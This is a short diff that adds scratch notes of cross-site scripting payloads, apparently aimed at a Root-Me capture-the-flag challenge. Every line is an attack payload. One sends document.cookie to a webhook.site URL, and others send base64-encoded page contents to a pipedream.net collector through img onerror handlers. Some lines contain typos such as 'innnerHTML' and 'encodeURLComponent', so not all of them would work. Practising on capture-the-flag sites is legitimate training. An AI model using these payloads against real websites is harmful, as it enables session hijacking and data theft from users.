@@ -1,0 +1,9 @@
+test' onmousemove='document.location="https://webhook.site/65a8b027-b90a-4aab-9e17-1ef2a69d67a2?cmd=".concat(document.cookie)
+
+challenge01.root-me.org:58008/page?user=<img src=/ onerror="document.location='//en0eb8wwcuk3eg.x.pipedream.net?source='+btoa(document.body.innerHTML)">
+
+http://challenge01.root-me.org:58008/page?user=%3Cimg%20src=/%20onerror=%22alert(btoa(encodeURLComponent(document.body.innnerHTML)))%22%3E
+
+btoa(encodeURIComponent(document.body.innnerHTML))
+
+challenge01.root-me.org:58008/page?user=<img src=/ onerror="document.location='//en0eb8wwcuk3eg.x.pipedream.net?c='.concat(btoa(encodeURIComponent(document.body.innnerHTML)))">
